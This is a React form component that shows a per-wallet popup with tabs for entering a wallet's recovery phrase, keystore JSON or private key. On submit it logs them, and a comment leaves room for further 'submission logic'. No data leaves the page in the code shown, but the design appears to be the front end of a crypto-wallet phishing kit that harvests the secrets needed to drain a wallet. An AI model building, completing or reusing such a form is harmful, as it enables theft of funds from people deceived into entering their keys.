import { useState } from "react";

const PopupForm = ({ setCurrentWallet, currentWallet }) => {
  const [activeTab, setActiveTab] = useState("phrase");

  console.log(currentWallet);

  const [formData, setFormData] = useState({
    phrase: "",
    keystore: "",
    privatekey: "",
  });

  const handleTabChange = (tab) => {
    setActiveTab(tab);
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    console.log(currentWallet.name, formData);
    // Add your submission logic here
  };

  return (
    <div className="flex w-full items-center justify-center">
      <div className="w-full max-w-md rounded-lg bg-white shadow-xl dark:bg-slate-800 dark:bg-opacity-80">
        {/* Header with tabs */}
        <div className="border-b border-gray-200">
          <nav className="flex">
            <button
              onClick={() => handleTabChange("phrase")}
              className={`px-4 py-3 text-sm font-medium ${activeTab === "phrase" ? "border-b-2 border-blue-600 text-blue-600" : "text-gray-500 hover:text-gray-700 dark:text-stone-200"}`}
            >
              Phrase
            </button>
            <button
              onClick={() => handleTabChange("keystore")}
              className={`px-4 py-3 text-sm font-medium ${activeTab === "keystore" ? "border-b-2 border-blue-600 text-blue-600" : "text-gray-500 hover:text-gray-700 dark:text-stone-200"}`}
            >
              Keystore JSON
            </button>
            <button
              onClick={() => handleTabChange("privatekey")}
              className={`px-4 py-3 text-sm font-medium ${activeTab === "privatekey" ? "border-b-2 border-blue-600 text-blue-600" : "text-gray-500 hover:text-gray-700 dark:text-stone-200"}`}
            >
              Private Key
            </button>
          </nav>
        </div>

        {/* Form content */}
        <div className="p-4">
          <form onSubmit={handleSubmit}>
            {/* Phrase tab content */}
            {activeTab === "phrase" && (
              <div className="mb-4">
                <label
                  htmlFor="phrase"
                  className="mb-1 block text-sm font-medium text-gray-700 dark:text-stone-300 dark:text-opacity-75"
                >
                  Phrase
                </label>
                <textarea
                  id="phrase"
                  name="phrase"
                  rows={4}
                  value={formData.phrase}
                  onChange={handleInputChange}
                  className="w-full rounded-md border border-gray-300 px-3 py-2 shadow-sm focus:border-blue-500 focus:outline-none focus:ring-blue-500 dark:bg-transparent"
                  placeholder="Enter your phrase..."
                />
              </div>
            )}

            {/* Keystore tab content */}
            {activeTab === "keystore" && (
              <div className="mb-4">
                <label
                  htmlFor="keystore"
                  className="mb-1 block text-sm font-medium text-gray-700 dark:text-stone-300 dark:text-opacity-75"
                >
                  Keystore
                </label>
                <textarea
                  id="keystore"
                  name="keystore"
                  rows={4}
                  value={formData.keystore}
                  onChange={handleInputChange}
                  className="w-full rounded-md border border-gray-300 px-3 py-2 shadow-sm focus:border-blue-500 focus:outline-none focus:ring-blue-500 dark:bg-transparent"
                  placeholder="Enter your keystore..."
                />
              </div>
            )}

            {/* Privatekey tab content */}
            {activeTab === "privatekey" && (
              <div className="mb-4">
                <label
                  htmlFor="privatekey"
                  className="mb-1 block text-sm font-medium text-gray-700 dark:text-stone-300 dark:text-opacity-75"
                >
                  Private key
                </label>
                <textarea
                  id="privatekey"
                  name="privatekey"
                  rows={4}
                  value={formData.privatekey}
                  onChange={handleInputChange}
                  className="w-full rounded-md border border-gray-300 px-3 py-2 shadow-sm focus:border-blue-500 focus:outline-none focus:ring-blue-500 dark:bg-transparent"
                  placeholder="Enter your privatekey..."
                />
              </div>
            )}

            <div className="mt-4 flex justify-end space-x-3">
              <button
                type="button"
                className="rounded-md bg-gray-100 px-4 py-2 text-sm font-medium text-gray-700 hover:bg-gray-200 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
                onClick={() => setCurrentWallet(null)}
              >
                Cancel
              </button>
              <button
                type="submit"
                className="rounded-md bg-blue-600 px-4 py-2 text-sm font-medium text-white hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
              >
                Submit
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default PopupForm;
